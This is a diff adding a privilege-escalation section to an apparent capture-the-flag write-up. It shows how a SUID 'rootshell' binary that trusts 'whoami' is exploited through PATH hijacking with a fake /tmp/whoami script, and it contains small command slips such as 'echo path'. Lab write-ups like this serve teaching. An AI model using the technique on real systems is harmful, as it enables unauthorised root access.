@@ -58,10 +58,43 @@ spawn it
 
 ### PRIVILEGE ESCALATION
 
+So, find command gave list of programs thats has the SUID bit where I notice /home/tom/rootshell.
+
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/b45180eb-b46f-4ea7-bfef-0fd429b8ed74)
+
+``Inside /root/tom/ I found rootshell.c file and a compile file rootshell that owns SUID permissions.
+According this piece of code if the file is executed as Tom user by calling the function for “whoami” program for validation then you will get a privilege shell else it will print user-ID that is currently logged in will be displayed.``
+
+In simple words the rootshell program give a high privilege shell if the output of whoami program will be “tom”.
+
+You can easily take advantage of this configuration by abusing the PATH system. Here, we built a file as “whoami” in the / tmp directory, and write the following bash code to print “tom”
+
+``
+cd /tmp
+echo "printf "tom"" > whoami
+chmod 777 whoami
+``
+
+Add a temporary path variable with the help of the following command. you will observe that we had added /tmp as PATH variable.
+
+``
+export PATH=/tmp:$PATH
+echo path
+``
+Execute the rootshell
+
+``
+cd /home/tom
+./rootshell
+``
+
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/678f3e03-2613-4d6b-af49-848ee6964bc6)
 
 
+And we are done.
 
 
+Thank you.
 
 
 
